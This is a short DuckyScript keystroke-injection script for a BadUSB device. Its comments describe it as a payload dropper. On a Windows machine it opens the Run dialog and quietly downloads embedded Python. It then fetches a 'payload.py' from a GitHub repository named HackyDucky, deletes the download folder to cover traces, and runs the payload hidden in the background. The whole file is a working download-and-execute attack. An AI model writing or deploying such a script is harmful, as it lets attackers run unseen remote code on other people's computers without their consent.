REM Entry point for the python script
REM Will open cmd
REM Download python to temp directory 
REM Install python quietly via cmdline
REM Download and run the main payload

FUNCTION RUN()
    GUI r
    DELAY 500
END_FUNCTION

DEFAULT_DELAY 50

REM Download python

RUN()
STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zip https://www.python.org/ftp/python/3.13.5/python-3.13.5-embed-amd64.zip

REM Download main payload while python being downloaded
RUN()
STRING curl -q -s --output-dir %localappdata%\python1 -o python-manager.py https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py
DELAY 30000

REM Unzip python
RUN()
STRINGLN cmd /c "cd %localappdata% && mkdir python1 > nul & tar -xf Temp\py\tmp.zip --cd python1"

REM remove python download dir to avoid pollution
RUN()
STRING rmdir /s /q %localappdata%\Temp\py\

DELAY 3000

REM Run main payload
RUN()
STRING cmd /c start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py

REM Done!